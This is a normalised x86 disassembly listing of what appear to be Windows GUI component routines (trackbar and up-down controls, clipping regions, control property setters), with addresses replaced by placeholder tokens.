test al al
je r-xdata
movsx ebx [ edi + 0x8 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x238 ]
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x234 ]
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x230 ]
mov eax [ esi + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ esi + 0x18 ]
cmp ebx eax
jle r-xdata
sub ebx eax
mov [ ebp - 0x5 ] 0x1
push 0x1
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_40346c
cmp [ ebp - 0x5 ] 0x0
je r-xdata
sub ebx eax
mov [ ebp - 0x5 ] 0x1
sub [ edi + 0x8 ] bx
sub_4381b0
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
movsx eax [ edi + 0x8 ]
mov [ esp ] eax
movsx eax [ edi + 0xa ]
mov [ esp + 0x4 ] eax
mov eax esp
push eax
push 0x0
push 0x1206
mov eax ebx
call sub_44d054
push eax
call SendMessageA
mov esi eax
test esi esi
jl r-xdata
mov edx edi
mov eax ebx
call sub_447ddc
test [ esp + 0x8 ] 0x2
je r-xdata
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_437454
cmp [ eax + 0x1e ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_438210
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44b640
mov eax [ ebp - 0x4 ]
call sub_44d358
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_4383ab
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_446168
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192c0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc edi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403270
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor edx edx
push ebp
push sub_43838e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi + 0x10 ]
sub [ ebp - 0xc ] eax
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_4183f4
jmp r-xdata
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_418550
mov esi eax
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_437454
mov esi eax
cmp [ esi + 0x1f ] 0x0
je r-xdata
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_418550
mov esi eax
test ebx ebx
jne r-xdata
mov edx edi
mov eax esi
call sub_4373ac
dec ebx
cmp ebx 0xffffffff
jne r-xdata
add edi [ ebp - 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
cmp eax [ ebp - 0x8 ]
jne r-xdata
cmp edi [ esi + 0x10 ]
je r-xdata
add edi [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_418440
mov eax [ esi + 0x10 ]
sub [ ebp - 0xc ] eax
sub_4383d0
push esi
push edi
push ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
push esp
mov edx edi
mov eax esi
mov si 0xffb1
call sub_40346c
mov al [ esp ]
pop edx
pop edi
pop esi
retn
sub_4383f0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_445c34
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x228 ]
jne r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_438424
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x228 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x228 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x224 ]
call sub_454418
mov eax ebx
call sub_44d054
xor edx edx
call sub_429a60
mov edx [ ebx + 0x224 ]
call sub_45445c
mov edx ebx
mov eax [ ebx + 0x228 ]
call sub_42093c
mov eax [ ebx + 0x228 ]
call sub_453a88
push eax
mov eax ebx
call sub_44d054
pop edx
call sub_429a60
jmp r-xdata
mov eax ebx
call sub_437c78
pop esi
pop ebx
retn
sub_438498
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_453a88
push eax
mov eax ebx
call sub_44d054
pop edx
call sub_429a60
mov eax ebx
call sub_437c78
pop esi
pop ebx
retn
sub_4384c0
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x262 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
sub_438510
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43862f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_43860c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419260
push eax
mov eax esi
call sub_418f30
mov edx eax
pop eax
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192c0
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4051f0
add esp 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192c0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192c0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44d054
mov ecx [ ebp - 0x4 ]
pop edx
call sub_429a70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438613
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_437454
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ebx * 4 ] eax
inc ebx
dec esi
jne r-xdata
sub_43863c
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] 0x0
push ebp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_437454
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x218 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_437454
pop edx
call sub_438510
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_40346c
pop esi
pop ecx
pop ebp
retn
sub_4386b8
push ebx
push ecx
mov ebx eax
mov eax [ r-xdata ]
mov [ esp ] eax
cmp [ ebx + 0x272 ] 0x0
je r-xdata
mov ecx [ ebx + 0x208 ]
mov dl 0x1
mov eax [ esp ]
call [ eax + 0x1c ]
pop edx
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_438700
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448d80
mov edx 0x96
mov eax esi
call sub_445f20
mov edx 0x2d
mov eax esi
call sub_445f44
mov dl 0x1
mov eax esi
call sub_44d288
xor eax eax
mov [ esi + 0x21c ] eax
mov [ esi + 0x220 ] 0xa
xor eax eax
mov [ esi + 0x228 ] eax
mov [ esi + 0x20c ] 0x1
mov [ esi + 0x210 ] 0x2
mov [ esi + 0x224 ] 0x1
xor eax eax
mov [ esi + 0x22c ] eax
xor eax eax
mov [ esi + 0x230 ] eax
mov [ esi + 0x214 ] 0x14
mov [ esi + 0x209 ] 0x0
mov [ esi + 0x20a ] 0x1
mov [ esi + 0x208 ] 0x0
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x218 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_4387d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x4
call sub_436150
mov edx esi
mov eax ebx
call sub_449ee0
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_449e0c
mov eax [ ebx + 0x220 ]
sub eax [ ebx + 0x21c ]
cmp eax 0x2710
setg al
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20a ]
mov eax [ eax + edx * 4 ]
mov edx [ esi + 0x4 ]
xor ecx ecx
mov cl [ ebx + 0x208 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebx + 0x209 ]
or eax [ edx * 4 + rw-data ]
or eax 0x40
or eax 0x20
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x24 ]
and eax 0xfffffffc
or eax 0x8
mov [ esi + 0x24 ] eax
cmp [ ebx + 0x218 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x80
sub_43888a
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_44a00c
mov eax ebx
call sub_44d358
test al al
je r-xdata
pop ebx
retn
push 0x0
mov eax [ ebx + 0x214 ]
push eax
push 0x41b
mov eax ebx
call sub_44d054
push eax
call SendMessageA
mov eax [ ebx + 0x20c ]
push eax
push 0x0
push 0x417
mov eax ebx
call sub_44d054
push eax
call SendMessageA
mov eax [ ebx + 0x210 ]
push eax
push 0x0
push 0x415
mov eax ebx
call sub_44d054
push eax
call SendMessageA
mov eax [ ebx + 0x21c ]
push eax
push 0x0
push 0x407
mov eax ebx
call sub_44d054
push eax
call SendMessageA
mov eax [ ebx + 0x220 ]
push eax
push 0x0
push 0x408
mov eax ebx
call sub_44d054
push eax
call SendMessageA
mov eax ebx
call sub_438d70
mov eax [ ebx + 0x228 ]
push eax
push 0x1
push 0x405
mov eax ebx
call sub_44d054
push eax
call SendMessageA
push 0x1
mov eax [ ebx + 0x224 ]
push eax
push 0x414
mov eax ebx
call sub_44d054
push eax
call SendMessageA
sub_438974
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x400
mov eax ebx
call sub_44d054
push eax
call SendMessageA
mov [ ebx + 0x228 ] eax
mov eax ebx
mov si 0xffb3
call sub_40346c
xor eax eax
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_4389b4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x400
mov eax ebx
call sub_44d054
push eax
call SendMessageA
mov [ ebx + 0x228 ] eax
mov eax ebx
mov si 0xffb3
call sub_40346c
xor eax eax
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_4389f4
push ebx
mov ebx eax
mov eax ebx
call sub_44d358
test al al
je r-xdata
mov eax [ ebx + 0x214 ]
pop ebx
retn
push 0x0
push 0x0
push 0x41c
mov eax ebx
call sub_44d054
push eax
call SendMessageA
pop ebx
retn
sub_438a24
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] dl
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov eax ebx
call sub_44a5f4
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
sub_438a78
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x110 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_438bee
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi edi
jle r-xdata
cmp esi [ ebp - 0x4 ]
jle r-xdata
lea edx [ ebp - 0x10c ]
mov eax [ ebx ]
call sub_4031c0
lea eax [ ebp - 0x10c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x4
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x110 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_403a24
cmp edi [ ebp - 0x4 ]
jge r-xdata
mov [ ebp - 0x4 ] esi
mov eax edi
sub eax esi
cmp eax 0x2710
setg al
mov edx [ ebx + 0x220 ]
sub edx [ ebx + 0x21c ]
cmp edx 0x2710
setg dl
cmp al dl
je r-xdata
mov [ ebp - 0x4 ] edi
cmp esi [ ebx + 0x21c ]
je r-xdata
mov [ ebx + 0x21c ] esi
mov [ ebx + 0x220 ] edi
mov eax ebx
call sub_44a5f4
cmp edi [ ebx + 0x220 ]
je r-xdata
mov [ ebx + 0x21c ] esi
mov eax ebx
call sub_44d358
test al al
je r-xdata
mov eax [ ebx + 0x228 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ ebx + 0x220 ] edi
mov eax ebx
call sub_44d358
test al al
je r-xdata
push esi
push 0x1
push 0x407
mov eax ebx
call sub_44d054
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438bf5
lea eax [ ebp - 0x110 ]
call sub_403fe8
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x228 ] eax
mov eax ebx
call sub_44d358
test al al
je r-xdata
push edi
push 0x1
push 0x408
mov eax ebx
call sub_44d054
push eax
call SendMessageA
mov eax ebx
mov si 0xffb3
call sub_40346c
mov eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x405
mov eax ebx
call sub_44d054
push eax
call SendMessageA
sub_438c48
push ebx
mov ebx eax
cmp edx [ ebx + 0x224 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x224 ] edx
mov eax ebx
call sub_44d358
test al al
je r-xdata
push 0x1
mov eax [ ebx + 0x224 ]
push eax
push 0x414
mov eax ebx
call sub_44d054
push eax
call SendMessageA
sub_438cac
push ebx
mov ebx eax
cmp edx [ ebx + 0x20c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x20c ] edx
mov eax ebx
call sub_44d358
test al al
je r-xdata
mov eax [ ebx + 0x20c ]
push eax
push 0x0
push 0x417
mov eax ebx
call sub_44d054
push eax
call SendMessageA
sub_438ce8
push ebx
mov ebx eax
cmp edx [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] edx
mov eax ebx
call sub_44d358
test al al
je r-xdata
mov eax [ ebx + 0x210 ]
push eax
push 0x0
push 0x415
mov eax ebx
call sub_44d054
push eax
call SendMessageA
sub_438d24
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x214 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x214 ] esi
mov eax ebx
call sub_44d358
test al al
je r-xdata
push 0x0
push esi
push 0x41b
mov eax ebx
call sub_44d054
push eax
call SendMessageA
sub_438d70
push ebx
mov ebx eax
mov eax ebx
call sub_44d358
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x22c ] 0x0
jne r-xdata
mov dx [ ebx + 0x230 ]
mov ax [ ebx + 0x22c ]
call sub_406b88
push eax
push 0x1
push 0x40a
mov eax ebx
call sub_44d054
push eax
call SendMessageA
cmp [ ebx + 0x230 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x413
mov eax ebx
call sub_44d054
push eax
call SendMessageA
jmp r-xdata
sub_438e1c
push ebx
push esi
push edi
push ebp
add esp 0xffffffd0
mov edi edx
mov ebx eax
call sub_43af70
call sub_43b050
test al al
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ edi + 0x8 ]
cmp [ eax + 0x8 ] 0xfffffff4
jne r-xdata
add esp 0x30
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp eax
mov eax [ ebp + 0xc ]
dec eax
je r-xdata
mov [ edi + 0xc ] 0x20
jmp r-xdata
sub eax 0x10000
je r-xdata
mov eax [ ebp + 0x24 ]
dec eax
je r-xdata
jmp r-xdata
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax ebx
mov si 0xffb5
call sub_40346c
test al al
je r-xdata
sub eax 0x2
je r-xdata
xor eax eax
mov [ edi + 0xc ] eax
jmp r-xdata
push 0x0
push 0x0
lea eax [ esp + 0xc ]
push eax
mov eax ebx
call sub_44d054
push eax
call sub_43af70
mov ecx [ ebp + 0x10 ]
pop edx
call sub_43b150
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0x129
mov eax ebx
call sub_44790c
test al 0x1
jne r-xdata
lea eax [ esp + 0x4 ]
push eax
push 0x0
push 0x419
mov eax ebx
call sub_44d054
push eax
call SendMessageA
xor eax eax
mov [ esp ] eax
mov eax ebx
mov si 0xffb5
call sub_40346c
test al al
je r-xdata
jmp r-xdata
xor eax eax
mov [ edi + 0xc ] eax
jmp r-xdata
push 0xffffffff
push 0xffffffff
lea eax [ esp + 0xc ]
push eax
call InflateRect
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
inc [ esp ]
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x24 ]
add eax [ esp ]
mov [ esp + 0x8 ] eax
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x2c ]
sub eax [ esp ]
mov [ esp + 0x10 ] eax
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x20 ]
add eax [ esp ]
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x28 ]
sub eax [ esp ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push eax
call CreateRectRgn
mov esi eax
push esi
mov eax [ ebp + 0x10 ]
push eax
call SelectClipRgn
call sub_43af70
lea ecx [ esp + 0x14 ]
mov dl 0x22
call sub_43b32c
lea eax [ esp + 0x14 ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_44d054
push eax
call sub_43af70
mov ecx [ ebp + 0x10 ]
pop edx
call sub_43b150
push esi
call DeleteObject
push 0x0
mov eax [ ebp + 0x10 ]
push eax
call SelectClipRgn
sub_438ff0
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
call sub_43af70
call sub_43b050
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44b4a8
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax ebx
mov si 0xffb5
call sub_40346c
test al al
je r-xdata
push 0x0
push 0x0
lea eax [ esp + 0x8 ]
push eax
mov eax ebx
call sub_44d054
push eax
call sub_43af70
mov ecx [ edi + 0x4 ]
pop edx
call sub_43b150
mov [ edi + 0xc ] 0x1
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0x129
mov eax ebx
call sub_44790c
test al 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
lea eax [ esp + 0x8 ]
push eax
call InflateRect
sub_4390a4
push ebp
mov ebp esp
push ecx
push ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_448d80
push 0x2
call GetSystemMetrics
mov edx eax
mov eax ebx
call sub_445f20
push 0x14
call GetSystemMetrics
mov edx eax
mov eax ebx
call sub_445f44
mov eax [ ebx + 0x4c ]
mov edx eax
sar eax 0x1
jns r-xdata
add esp 0xfffffff0
call sub_4035bc
add edx eax
mov eax ebx
call sub_445f44
mov [ ebx + 0x208 ] 0x1
mov [ ebx + 0x21f ] 0x0
mov [ ebx + 0x21c ] 0x0
mov [ ebx + 0x210 ] 0x0
mov [ ebx + 0x212 ] 0x64
mov [ ebx + 0x214 ] 0x1
mov [ ebx + 0x228 ] 0x1
mov [ ebx + 0x229 ] 0x1
mov [ ebx + 0x21e ] 0x1
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
adc eax 0x0
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_439170
push ebx
push esi
mov ebx edx
mov esi eax
mov eax 0x10
call sub_436150
mov edx ebx
mov eax esi
call sub_449ee0
or [ ebx + 0x4 ] 0x2
cmp [ esi + 0x228 ] 0x1
jne r-xdata
or [ ebx + 0x4 ] 0x8
or [ ebx + 0x4 ] 0x4
jmp r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
or [ ebx + 0x4 ] 0x40
cmp [ esi + 0x229 ] 0x0
jne r-xdata
cmp [ esi + 0x21e ] 0x0
jne r-xdata
or [ ebx + 0x4 ] 0x20
cmp [ esi + 0x21f ] 0x0
je r-xdata
or [ ebx + 0x4 ] 0x80
mov ecx r-xdata
mov edx ebx
mov eax esi
call sub_449e0c
mov eax [ ebx + 0x24 ]
and eax 0xfffffffc
or eax 0x8
mov [ ebx + 0x24 ] eax
pop esi
pop ebx
retn
or [ ebx + 0x4 ] 0x1
sub_439204
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov esi [ ebx + 0x48 ]
mov eax ebx
call sub_44a00c
mov eax [ ebx + 0x20c ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_445f20
mov dx [ ebx + 0x210 ]
mov ax [ ebx + 0x212 ]
call sub_406b88
push eax
push 0x0
push 0x465
mov eax ebx
call sub_44d054
push eax
call SendMessageA
xor edx edx
mov ax [ ebx + 0x21c ]
call sub_406b88
push eax
push 0x0
push 0x467
mov eax ebx
call sub_44d054
push eax
call SendMessageA
mov eax esp
push eax
push 0x1
push 0x46c
mov eax ebx
call sub_44d054
push eax
call SendMessageA
mov eax [ ebx + 0x214 ]
mov [ esp + 0x4 ] eax
mov eax esp
push eax
push 0x1
push 0x46b
mov eax ebx
call sub_44d054
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
mov edx eax
mov eax ebx
call sub_439728
push 0x0
mov eax [ ebx + 0x20c ]
call sub_44d054
push eax
push 0x469
mov eax ebx
call sub_44d054
push eax
call SendMessageA
sub_4392dc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ edi + 0x4 ] 0x4
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ edi + 0x6 ]
mov dx [ ebx + 0x21c ]
cmp ax dx
jle r-xdata
cmp dx ax
jle r-xdata
xor edx edx
mov eax ebx
mov si 0xffb2
call sub_40346c
jmp r-xdata
mov ax [ edi + 0x6 ]
mov [ ebx + 0x21c ] ax
mov dl 0x1
mov eax ebx
mov si 0xffb2
call sub_40346c
sub_439334
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_44b640
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_44d054
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_439364
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ edi + 0x4 ] 0x4
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ edi + 0x6 ]
mov dx [ ebx + 0x21c ]
cmp ax dx
jle r-xdata
cmp dx ax
jle r-xdata
xor edx edx
mov eax ebx
mov si 0xffb2
call sub_40346c
jmp r-xdata
mov ax [ edi + 0x6 ]
mov [ ebx + 0x21c ] ax
mov dl 0x1
mov eax ebx
mov si 0xffb2
call sub_40346c
sub_4393d8
push ebx
push esi
push ecx
mov esi eax
mov [ esp ] 0x1
xor ebx ebx
mov ax [ esi + 0x218 ]
cmp ax [ esi + 0x210 ]
jge r-xdata
mov ax [ esi + 0x218 ]
cmp ax [ esi + 0x212 ]
jle r-xdata
cmp [ esi + 0x21a ] 0x0
jl r-xdata
mov ax [ esi + 0x21a ]
test ax ax
jge r-xdata
cmp [ esi + 0x21a ] 0x0
jle r-xdata
xor ebx ebx
jmp r-xdata
test ax ax
jle r-xdata
mov bl 0x2
jmp r-xdata
cmp [ esi + 0x232 ] 0x0
je r-xdata
mov bl 0x1
cmp [ esi + 0x23a ] 0x0
je r-xdata
mov ecx esp
mov edx esi
mov eax [ esi + 0x234 ]
call [ esi + 0x230 ]
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
mov ax [ esi + 0x218 ]
push eax
push ebx
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax [ esi + 0x23c ]
call [ esi + 0x238 ]
sub_439494
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
mov esi [ ebx + 0x8 ]
cmp [ esi + 0x8 ] 0xfffffd2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov dx [ esi + 0xc ]
mov bp [ esi + 0x10 ]
add dx bp
mov ecx ebp
mov eax edi
call sub_4393bc
xor al 0x1
neg al
sbb eax eax
mov [ ebx + 0xc ] eax
sub_4394ec
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x1
test edi edi
je r-xdata
xor ebx ebx
mov edx esi
mov eax edi
call sub_4031d4
test al al
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4031fc
mov edi eax
test edi edi
jne r-xdata
sub_43951c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4396fa
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
cmp [ ebx + 0x20c ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
call sub_449d84
dec eax
test eax eax
jl r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_44d358
test al al
je r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439701
lea eax [ ebp - 0x18 ]
call sub_403fe8
retn
mov eax [ esi + 0x30 ]
cmp eax [ ebx + 0x30 ]
jne r-xdata
xor eax eax
mov [ ebx + 0x20c ] eax
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_44d054
push eax
call SendMessageA
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_449d48
cmp ebx eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
jne r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_449d48
mov edx [ r-xdata ]
call sub_4033fc
